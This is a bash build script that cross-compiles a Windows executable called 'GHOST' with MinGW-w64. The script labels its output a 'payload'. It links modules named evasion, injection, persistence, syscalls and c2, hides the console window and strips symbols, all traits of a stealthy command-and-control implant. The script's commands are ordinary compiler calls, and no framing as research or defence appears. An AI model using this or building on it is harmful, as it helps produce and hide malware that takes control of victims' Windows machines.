#!/bin/bash
# GHOST build script for Linux (Cross-Compilation via MinGW-w64)
# Requires: sudo apt install mingw-w64

set -e

OUT_DIR="build"
mkdir -p "$OUT_DIR"

echo "[*] Compiling resources..."
x86_64-w64-mingw32-windres resources/ghost.rc -O coff -o "$OUT_DIR/ghost.res"

echo "[*] Compiling and linking payload (Release/Optimized)..."
# -mwindows : GUI subsystem (no console)
# -static... : Statically link CRT/C++ standard library (equivalent to MSVC /MT)
# -s : Strip symbols
x86_64-w64-mingw32-g++ \
    -std=c++17 -O2 -s -mwindows \
    -static -static-libgcc -static-libstdc++ \
    -I include \
    src/main.cpp \
    src/syscalls.cpp \
    src/evasion.cpp \
    src/injection.cpp \
    src/persistence.cpp \
    src/c2.cpp \
    src/utils.cpp \
    "$OUT_DIR/ghost.res" \
    -lwinhttp -lwbemuuid -lole32 -loleaut32 -lntdll -ladvapi32 -lshell32 -luser32 \
    -o "$OUT_DIR/ghost.exe"

echo "[+] Build succeeded: $OUT_DIR/ghost.exe"
ls -lh "$OUT_DIR/ghost.exe"
